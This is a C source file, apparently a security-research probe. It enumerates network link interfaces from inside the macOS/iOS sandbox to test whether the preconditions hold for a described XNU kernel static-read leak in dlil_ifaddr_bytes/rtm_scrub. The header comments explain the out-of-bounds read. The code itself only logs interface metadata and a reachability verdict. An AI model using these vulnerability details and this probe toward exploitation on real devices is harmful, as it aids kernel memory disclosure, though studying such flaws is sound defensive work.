// probe_ifc.c - Enumerate AF_LINK interfaces via getifaddrs (sandbox-safe).
//
// Goal: determine whether any AF_LINK interface exposed to an unprivileged app
// has sdl_type == IFT_ETHER (6) and sdl_alen > 8. That is the reachability
// gate for the rtm_scrub/dlil_ifaddr_bytes kernel static-read leak:
// in 24A446 dlil_ifaddr_bytes returns size == alen with no clamp, so
// bcopy(unspec[8], LLADDR, alen) reads past the 8-byte static array.
//
// Layout notes (Darwin 64-bit, verified against <net/if.h> / <sys/socket.h>):
//
//   struct ifaddrs {
//     struct ifaddrs *ifa_next;   // +0
//     char           *ifa_name;   // +8  (POINTER to string, not inline)
//     unsigned int    ifa_flags;  // +16 (+4 pad)
//     void           *ifa_addr;   // +24
//     void           *ifa_netmask;
//     void           *ifa_dstaddr;
//     void           *ifa_broadaddr;
//     void           *ifa_data;
//   };
//
//   struct sockaddr_dl {
//     uint8_t sdl_len;     // +0
//     uint8_t sdl_family;  // +1  (AF_LINK = 18)
//     uint16_t sdl_index;  // +2
//     uint8_t sdl_type;    // +4  (IFT_ETHER = 6)
//     uint8_t sdl_nlen;    // +5
//     uint8_t sdl_alen;    // +6
//     uint8_t sdl_slen;    // +7
//     char    sdl_data[];  // +8
//   };
//
//   sdl_data is laid out as: name[sdl_nlen] || addr[sdl_alen] || selector[sdl_slen]
//   so the hardware address starts at sdl_data + sdl_nlen, NOT at sdl_data[0].
//   LLADDR(sdl) in XNU is defined exactly as:
//      (uint8_t *)((char *)sdl->sdl_data + sdl->sdl_nlen)
//   and LLADDR_LEN(sdl) = sdl->sdl_alen.
//
//   Previous attempts bug: read mac from sdl_data[0], which prints the
//   interface name (e.g. 65:6e:30 == "en0"). Verdict on lengths was still
//   computed from sdl_alen, so ABSENT was correct on lengths; only the
//   dumped bytes were wrong. Fixed here.

typedef unsigned long size_t;
typedef unsigned char u8;

extern int open(const char *, int, ...);
extern long write(int, const void *, size_t);
extern int close(int);
extern int unlink(const char *);
extern char *getenv(const char *);
extern int snprintf(char *, size_t, const char *, ...);
extern void syslog(int, const char *, ...);
extern void *dlopen(const char *path, int mode);
extern void *dlsym(void *h, const char *name);

#define O_WRONLY 0x0001
#define O_CREAT 0x0200
#define O_APPEND 0x0008

#define AF_LINK 18
#define IFT_ETHER 6

struct ifaddrs {
    struct ifaddrs *ifa_next;
    char *ifa_name;
    unsigned int ifa_flags;
    void *ifa_addr;
    void *ifa_netmask;
    void *ifa_dstaddr;
    void *ifa_broadaddr;
    void *ifa_data;
};

static char logpath[512];
static char linebuf[1024];

static void lg(const char *s) {
    // file: $HOME/Documents/probe_ifc.log (probe_getif.c pattern)
    int fd = open(logpath, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) { write(fd, s, __builtin_strlen(s)); close(fd); }
    // also echo to syslog so result is visible without house arrest
    syslog(1, "%s", s);
}

int main(void) {
    const char *home = getenv("HOME");
    if (home && *home)
        snprintf(logpath, sizeof(logpath), "%s/Documents/probe_ifc.log", home);
    else
        snprintf(logpath, sizeof(logpath), "/Documents/probe_ifc.log");
    unlink(logpath);

    void *libc = dlopen("/usr/lib/libSystem.B.dylib", 5);
    if (!libc) libc = dlopen("/usr/lib/libc.dylib", 5);
    if (!libc) { lg("ERR no libc\n"); return 1; }

    int (*p_getifaddrs)(struct ifaddrs **) = 0;
    void (*p_freeifaddrs)(struct ifaddrs *) = 0;
    p_getifaddrs = (int (*)(struct ifaddrs **))dlsym(libc, "getifaddrs");
    p_freeifaddrs = (void (*)(struct ifaddrs *))dlsym(libc, "freeifaddrs");
    if (!p_getifaddrs) { lg("ERR getifaddrs\n"); return 1; }

    struct ifaddrs *head = 0;
    int rc = p_getifaddrs(&head);
    snprintf(linebuf, sizeof(linebuf), "PROBE_IFC start rc=%d\n", rc);
    lg(linebuf);
    if (rc < 0 || !head) { lg("DONE\n"); return 1; }

    int total = 0, link_count = 0, ether_gt8 = 0, ether_gt8_nonzero = 0;
    long maxalen = 0;
    int fam_count[32];
    for (int i = 0; i < 32; i++) fam_count[i] = 0;

    for (struct ifaddrs *p = head; p; p = p->ifa_next) {
        total++;
        if (!p->ifa_addr) continue;
        u8 *sa = (u8 *)p->ifa_addr;
        u8 fam = sa[1];
        if (fam < 32) fam_count[fam]++;
        if (fam != AF_LINK) continue;

        const char *ifname = p->ifa_name ? p->ifa_name : "?";
        u8 sdl_len   = sa[0];
        u8 sdl_type  = sa[4];
        u8 sdl_nlen  = sa[5];
        u8 sdl_alen  = sa[6];
        u8 sdl_slen  = sa[7];

        // Hardware address: sdl_data + sdl_nlen, length sdl_alen.
        // Guard against truncated sockaddr_dl.
        u8 *addr = sa + 8 + sdl_nlen;
        int need = 8 + sdl_nlen + sdl_alen + sdl_slen;
        int sa_avail = sdl_len; // sdl_len must cover the whole struct
        int addr_ok = (sa_avail >= need && sdl_len >= 8) ? 1 : 0;

        link_count++;
        if ((long)sdl_alen > maxalen) maxalen = sdl_alen;

        snprintf(linebuf, sizeof(linebuf),
            "IFC name=%s type=%d nlen=%d alen=%d slen=%d len=%d addr=",
            ifname, sdl_type, sdl_nlen, sdl_alen, sdl_slen, sdl_len);
        {
            char *o = linebuf;
            while (*o) o++;
            if (addr_ok) {
                for (int i = 0; i < sdl_alen && (size_t)(o - linebuf) < sizeof(linebuf) - 4; i++) {
                    if (i) *o++ = ':';
                    o[0] = "0123456789abcdef"[addr[i] >> 4];
                    o[1] = "0123456789abcdef"[addr[i] & 0xf];
                    o += 2;
                }
            } else {
                // truncated: log what we can safely claim
                const char *tag = " truncated(need=";
                while (*tag) *o++ = *tag++;
                // small int -> decimal inline
                int v = need;
                char t[12]; int n = 0;
                if (v == 0) *o++ = '0';
                else {
                    while (v) { t[n++] = '0' + (v % 10); v /= 10; }
                    while (n--) *o++ = t[n];
                }
                *o++ = ')';
            }
            *o = 0;
        }
        if (sdl_alen > 8) {
            int tail_nonzero = 0;
            if (addr_ok) {
                for (int i = 8; i < sdl_alen; i++) if (addr[i]) tail_nonzero = 1;
                if (sdl_type == IFT_ETHER) {
                    ether_gt8++;
                    if (tail_nonzero) ether_gt8_nonzero++;
                }
                snprintf(linebuf + __builtin_strlen(linebuf),
                    sizeof(linebuf) - __builtin_strlen(linebuf),
                    tail_nonzero ? " tail8=NONZERO" : " tail8=zero");
            } else {
                snprintf(linebuf + __builtin_strlen(linebuf),
                    sizeof(linebuf) - __builtin_strlen(linebuf),
                    " tail8=truncated");
            }
        }
        snprintf(linebuf + __builtin_strlen(linebuf),
            sizeof(linebuf) - __builtin_strlen(linebuf), "\n");
        lg(linebuf);
    }

    snprintf(linebuf, sizeof(linebuf),
        "SUMMARY total=%d links=%d maxalen=%ld ether_gt8=%d ether_gt8_nonzero=%d\n",
        total, link_count, maxalen, ether_gt8, ether_gt8_nonzero);
    lg(linebuf);

    // family histogram for diagnosis
    snprintf(linebuf, sizeof(linebuf), "FAMS");
    for (int i = 0; i < 32; i++) {
        if (fam_count[i] > 0) {
            char tmp[32];
            snprintf(tmp, sizeof(tmp), " f%d=%d", i, fam_count[i]);
            char *o = linebuf;
            while (*o) o++;
            unsigned int k = 0;
            while (tmp[k] && (size_t)(o - linebuf) < sizeof(linebuf) - 2) *o++ = tmp[k++];
            *o = 0;
        }
    }
    snprintf(linebuf + __builtin_strlen(linebuf),
        sizeof(linebuf) - __builtin_strlen(linebuf), "\n");
    lg(linebuf);

    // NOTE: this verdict is an interface-metadata heuristic, NOT a
    // network-connectivity check. No TCP/DNS/HTTP is performed.
    const char *verdict;
    if (ether_gt8_nonzero > 0) verdict = "REACHABLE";
    else if (ether_gt8 > 0) verdict = "PRESENT";
    else verdict = "ABSENT";
    snprintf(linebuf, sizeof(linebuf),
        "VERDICT|reachability|%s|ether_gt8=%d|ether_gt8_nonzero=%d|maxalen=%ld\n",
        verdict, ether_gt8, ether_gt8_nonzero, maxalen);
    lg(linebuf);
    lg("DONE\n");

    if (p_freeifaddrs) p_freeifaddrs(head);
    return 0;
}
